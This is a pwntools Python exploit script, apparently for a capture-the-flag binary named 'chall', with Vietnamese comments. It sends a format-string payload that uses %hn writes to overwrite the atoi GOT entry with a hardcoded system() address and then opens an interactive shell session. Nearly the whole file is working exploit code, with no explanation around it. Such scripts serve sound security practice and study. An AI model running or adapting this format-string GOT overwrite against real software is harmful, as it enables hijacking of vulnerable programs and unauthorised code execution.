from pwn import *

binary = ELF("chall")
r = process("./chall")
gdb.attach(r, api = True)

atoi_got = binary.got['atoi']

log.info(f"atoi() GOT address: {hex(atoi_got)}") 


system_addr = 0x7fe0e8abc570  #demo 0x7fe0e8abc570

system_addr_high = (system_addr >> 32) & 0xFFFF
system_addr_medium = (system_addr >> 16) & 0xFFFF
system_addr_low = system_addr & 0xFFFF

print("Original values:")
print("High:", int(system_addr_high))
print("Medium:", int(system_addr_medium))
print("Low:", int(system_addr_low))

# Đưa các giá trị vào một danh sách
values = [
    ("high", system_addr_high, "13" ),
    ("medium", system_addr_medium, "12" ),
    ("low", system_addr_low, "11")
]

# Sắp xếp danh sách dựa trên giá trị
values.sort(key=lambda x: x[1])

print("\nSorted values:")

for item in values:
    print(item[0] + ":" , item[1] , item[2] )


payload1 = b"11111111" + p64(atoi_got ) + p64(atoi_got + 2 ) + p64(atoi_got + 4)

r.sendlineafter(b"A: ",payload1)

#payload2 = b"1_______%1p%12$n%2p%11$n"

# payload2 = b"1_______%" + str(int(system_addr_high) - 46).encode("ascii") + b"p%13$hn%" 
# payload2 += str(int(system_addr_low) - int(system_addr_high)).encode("ascii") + b"p%11$hn%"
# payload2 += str(int(system_addr_medium) - int(system_addr_low)).encode("ascii") + b"p%12$hn--" 
payload2 = b"1_______%" + str(values[0][1] - 46).encode("ascii") + b"p%" + values[0][2].encode("ascii") + b"$hn%" 
payload2 += str(values[1][1] - values[0][1]).encode("ascii") + b"p%"+ values[1][2].encode("ascii") + b"$hn%"
payload2 += str(values[2][1] - values[1][1]).encode("ascii") + b"p%"+ values[2][2].encode("ascii") + b"$hn--" 

r.sendlineafter(b"B: ",payload2)

r.interactive()
